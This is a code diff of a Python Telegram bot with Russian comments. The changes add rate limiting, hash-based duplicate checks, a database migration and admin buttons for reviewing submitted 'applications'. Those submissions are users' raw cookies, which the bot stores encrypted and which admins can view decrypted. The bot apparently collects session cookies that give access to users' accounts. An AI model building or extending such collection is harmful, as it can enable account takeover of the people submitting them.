@@ -7,6 +7,7 @@ import string
 import signal
 import sys
 import os
+import threading
 from cryptography.fernet import Fernet
 
 # Загружаем переменные окружения из .env файла (для локального запуска)
@@ -65,6 +66,12 @@ chat_users = set()
 # Словарь для хранения времени последнего запроса помощи
 help_request_cooldown = {}
 
+# Словарь для хранения времени последней отправки заявки
+submit_request_cooldown = {}
+
+# Блокировка для thread-safe обработки заявок
+submit_lock = threading.Lock()
+
 # Словарь для связи сообщений админа и пользователя (для ответов через reply)
 message_user_map = {}
 
@@ -101,10 +108,26 @@ def create_database():
             username TEXT,
             unique_id TEXT,
             encrypted_cookie TEXT,
+            cookie_hash TEXT,
             created_at INTEGER,
             FOREIGN KEY (user_id) REFERENCES users(user_id)
         )
     """)
+    
+    # Проверяем существует ли колонка cookie_hash, если нет - добавляем (миграция)
+    cursor.execute("PRAGMA table_info(cookies)")
+    columns = [column[1] for column in cursor.fetchall()]
+    if 'cookie_hash' not in columns:
+        print("Добавляем колонку cookie_hash в таблицу cookies...")
+        cursor.execute("ALTER TABLE cookies ADD COLUMN cookie_hash TEXT")
+        conn.commit()
+    
+    # Создаем индекс для быстрого поиска дубликатов по хешу
+    cursor.execute("""
+        CREATE INDEX IF NOT EXISTS idx_cookie_hash 
+        ON cookies(cookie_hash, created_at DESC)
+    """)
+    
     conn.commit()
     conn.close()
 
@@ -378,7 +401,53 @@ def handle_profile_button(message):
 @bot.callback_query_handler(func=lambda call: True)
 def handle_callback(call):
     """Обработчик inline кнопок"""
-    if call.data.startswith("view_req_"):
+    if call.data == "refresh_requests":
+        # Обновление списка заявок
+        conn = sqlite3.connect(DATABASE_FILE)
+        cursor = conn.cursor()
+        
+        cursor.execute("SELECT COUNT(*) FROM cookies")
+        total_requests = cursor.fetchone()[0]
+        
+        cursor.execute("""
+            SELECT id, username, unique_id, created_at 
+            FROM cookies 
+            ORDER BY created_at DESC 
+            LIMIT 20
+        """)
+        requests = cursor.fetchall()
+        conn.close()
+        
+        if not requests:
+            bot.answer_callback_query(call.id, "📋 Заявок нет")
+            return
+        
+        markup = telebot.types.InlineKeyboardMarkup()
+        for req_id, username, unique_id, created_at in requests:
+            time_str = time.strftime('%d.%m %H:%M', time.localtime(created_at))
+            button = telebot.types.InlineKeyboardButton(
+                text=f"@{username} ({unique_id}) - {time_str}",
+                callback_data=f"view_req_{req_id}"
+            )
+            markup.add(button)
+        
+        refresh_btn = telebot.types.InlineKeyboardButton(
+            text="🔄 Обновить",
+            callback_data="refresh_requests"
+        )
+        markup.add(refresh_btn)
+        
+        bot.edit_message_text(
+            f"📋 Заявки (всего: {total_requests})\n\n"
+            f"Последние 20 заявок:\n"
+            f"Нажмите на заявку для просмотра",
+            call.message.chat.id,
+            call.message.message_id,
+            reply_markup=markup
+        )
+        bot.answer_callback_query(call.id, "✅ Обновлено")
+    
+    elif call.data.startswith("view_req_"):
         # Просмотр заявки
         req_id = int(call.data.split("_")[2])
         
@@ -409,7 +478,12 @@ def handle_callback(call):
                 text="🗑️ Удалить заявку",
                 callback_data=f"del_req_{req_id}"
             )
-            delete_markup.add(delete_btn)
+            back_to_list_btn = telebot.types.InlineKeyboardButton(
+                text="⬅️ К списку заявок",
+                callback_data="refresh_requests"
+            )
+            delete_markup.row(delete_btn)
+            delete_markup.row(back_to_list_btn)
             
             # Отправляем расшифрованные данные
             bot.send_message(
@@ -532,43 +606,111 @@ def handle_pass(message):
     
     user_id = message.from_user.id
     username = message.from_user.username
-    conn = sqlite3.connect(DATABASE_FILE)
-    cursor = conn.cursor()
-    cursor.execute("SELECT unique_id FROM users WHERE user_id = ?", (user_id,))
-    unique_id_row = cursor.fetchone()
+    current_time = time.time()
+    cookie_text = message.text
     
-    if not unique_id_row:
-        conn.close()
-        bot.send_message(message.chat.id, "Ошибка! Сначала выполните /start")
-        return
-    
-    unique_id = unique_id_row[0]
-    
-    # Шифруем куки
-    encrypted_cookie = cipher.encrypt(message.text.encode()).decode()
-    
-    # Сохраняем в БД
-    cursor.execute("""
-        INSERT INTO cookies (user_id, username, unique_id, encrypted_cookie, created_at)
-        VALUES (?, ?, ?, ?, ?)
-    """, (user_id, username, unique_id, encrypted_cookie, int(time.time())))
-    conn.commit()
-    conn.close()
+    # Используем блокировку для thread-safe обработки
+    with submit_lock:
+        # Проверка кулдауна 10 секунд между любыми отправками
+        if user_id in submit_request_cooldown:
+            time_passed = current_time - submit_request_cooldown[user_id]
+            if time_passed < 10:
+                remaining = int(10 - time_passed)
+                bot.send_message(message.chat.id, f"⏰ Подождите {remaining} секунд перед следующей отправкой заявки")
+                return
+        
+        # Сразу блокируем повторную отправку от этого юзера
+        submit_request_cooldown[user_id] = current_time
+        
+        # Создаем хеш исходного текста для проверки дубликатов
+        cookie_hash = hashlib.sha256(cookie_text.encode()).hexdigest()
+        
+        # Шифруем куки
+        encrypted_cookie = cipher.encrypt(cookie_text.encode()).decode()
+        
+        # Используем транзакцию для атомарной проверки и вставки
+        conn = sqlite3.connect(DATABASE_FILE, timeout=10.0)
+        conn.execute("BEGIN IMMEDIATE")  # Начинаем эксклюзивную транзакцию
+        
+        try:
+            cursor = conn.cursor()
+            
+            cursor.execute("SELECT unique_id FROM users WHERE user_id = ?", (user_id,))
+            unique_id_row = cursor.fetchone()
+            
+            if not unique_id_row:
+                conn.rollback()
+                conn.close()
+                bot.send_message(message.chat.id, "Ошибка! Сначала выполните /start")
+                return
+            
+            unique_id = unique_id_row[0]
+            
+            # Проверяем есть ли уже такие же куки в БД по ХЕШУ (с блокировкой таблицы)
+            cursor.execute("""
+                SELECT created_at FROM cookies 
+                WHERE cookie_hash = ? 
+                ORDER BY created_at DESC 
+                LIMIT 1
+            """, (cookie_hash,))
+            
+            existing_cookie = cursor.fetchone()
+            
+            if existing_cookie:
+                last_submit_time = existing_cookie[0]
+                time_since_last = current_time - last_submit_time
+                
+                # Если те же куки были отправлены менее часа назад - отклоняем
+                if time_since_last < 3600:  # 3600 секунд = 1 час
+                    remaining_minutes = int((3600 - time_since_last) / 60)
+                    remaining_seconds = int((3600 - time_since_last) % 60)
+                    conn.rollback()
+                    conn.close()
+                    bot.send_message(
+                        message.chat.id, 
+                        f"❌ Эти данные уже были отправлены!\n"
+                        f"⏰ Повторная отправка возможна через: {remaining_minutes} мин {remaining_seconds} сек"
+                    )
+                    return
+            
+            # Сохраняем в БД
+            cursor.execute("""
+                INSERT INTO cookies (user_id, username, unique_id, encrypted_cookie, cookie_hash, created_at)
+                VALUES (?, ?, ?, ?, ?, ?)
+            """, (user_id, username, unique_id, encrypted_cookie, cookie_hash, int(current_time)))
+            
+            last_row_id = cursor.lastrowid
+            conn.commit()
+            conn.close()
+            
+            # Отправляем уведомление администраторам (БЕЗ куков!)
+            for admin_id in admin_ids:
+                # Создаем inline кнопку для быстрого просмотра
+                quick_view_markup = telebot.types.InlineKeyboardMarkup()
+                view_btn = telebot.types.InlineKeyboardButton(
+                    text="🔓 Открыть заявку",
+                    callback_data=f"view_req_{last_row_id}"
+                )
+                quick_view_markup.add(view_btn)
+                
+                bot.send_message(
+                    admin_id, 
+                    f"🆕 Новая заявка\n"
+                    f"👤 @{username}\n"
+                    f"🆔 {unique_id}\n"
+                    f"⏰ {time.strftime('%H:%M:%S', time.localtime())}\n\n"
+                    f"🔐 Данные зашифрованы и сохранены в БД",
+                    reply_markup=quick_view_markup
+                )
 
-    # Отправляем уведомление администраторам (БЕЗ куков!)
-    for admin_id in admin_ids:
-        bot.send_message(
-            admin_id, 
-            f"🆕 Новая заявка\n"
-            f"👤 @{username}\n"
-            f"🆔 {unique_id}\n"
-            f"⏰ {time.strftime('%H:%M:%S', time.localtime())}\n\n"
-            f"🔐 Данные зашифрованы и сохранены в БД\n"
-            f"Используйте /getcookie {unique_id} для просмотра"
-        )
-
-    # Отправляем сообщение пользователю о принятии заявки
-    bot.send_message(message.chat.id, "✅ Ваша заявка успешно принята! Ожидайте сообщение от наших модераторов.")
+            # Отправляем сообщение пользователю о принятии заявки
+            bot.send_message(message.chat.id, "✅ Ваша заявка успешно принята! Ожидайте сообщение от наших модераторов.")
+        
+        except Exception as e:
+            conn.rollback()
+            conn.close()
+            print(f"Ошибка при обработке заявки: {e}")
+            bot.send_message(message.chat.id, "❌ Ошибка обработки заявки. Попробуйте позже.")
 
 
 @bot.message_handler(commands=['con'])
@@ -776,6 +918,12 @@ def handle_requests_button(message):
     
     conn = sqlite3.connect(DATABASE_FILE)
     cursor = conn.cursor()
+    
+    # Получаем статистику
+    cursor.execute("SELECT COUNT(*) FROM cookies")
+    total_requests = cursor.fetchone()[0]
+    
+    # Получаем последние заявки
     cursor.execute("""
         SELECT id, username, unique_id, created_at 
         FROM cookies 
@@ -786,7 +934,16 @@ def handle_requests_button(message):
     conn.close()
     
     if not requests:
-        bot.send_message(message.chat.id, "📋 Заявок нет", reply_markup=telebot.types.ReplyKeyboardRemove())
+        # Кнопка "Назад"
+        back_markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
+        back_btn = telebot.types.KeyboardButton(text='⬅️ Назад')
+        back_markup.add(back_btn)
+        
+        bot.send_message(
+            message.chat.id, 
+            "📋 Заявок нет", 
+            reply_markup=back_markup
+        )
         return
     
     # Создаем inline кнопки для каждой заявки
@@ -799,11 +956,38 @@ def handle_requests_button(message):
         )
         markup.add(button)
     
+    # Добавляем кнопку обновить
+    refresh_btn = telebot.types.InlineKeyboardButton(
+        text="🔄 Обновить",
+        callback_data="refresh_requests"
+    )
+    markup.add(refresh_btn)
+    
+    # Кнопка "Назад" через keyboard
+    back_markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
+    back_btn = telebot.types.KeyboardButton(text='⬅️ Назад')
+    back_markup.add(back_btn)
+    
     bot.send_message(
         message.chat.id, 
-        f"📋 Последние 20 заявок:\n\nНажмите на заявку для просмотра",
+        f"📋 Заявки (всего: {total_requests})\n\n"
+        f"Последние 20 заявок:\n"
+        f"Нажмите на заявку для просмотра",
         reply_markup=markup
     )
+    bot.send_message(
+        message.chat.id,
+        "Используйте кнопку ниже для возврата в админ-панель",
+        reply_markup=back_markup
+    )
+
+@bot.message_handler(func=lambda message: message.text == "⬅️ Назад")
+def handle_back_button(message):
+    """Возврат в админ-панель"""
+    if message.from_user.id in admin_ids or is_user_admin(message.from_user.id):
+        admin_panel(message)
+    else:
+        send_main_menu(message.chat.id, message.from_user.id)
 
 # Словарь для хранения состояния рассылки
 broadcast_state = {}
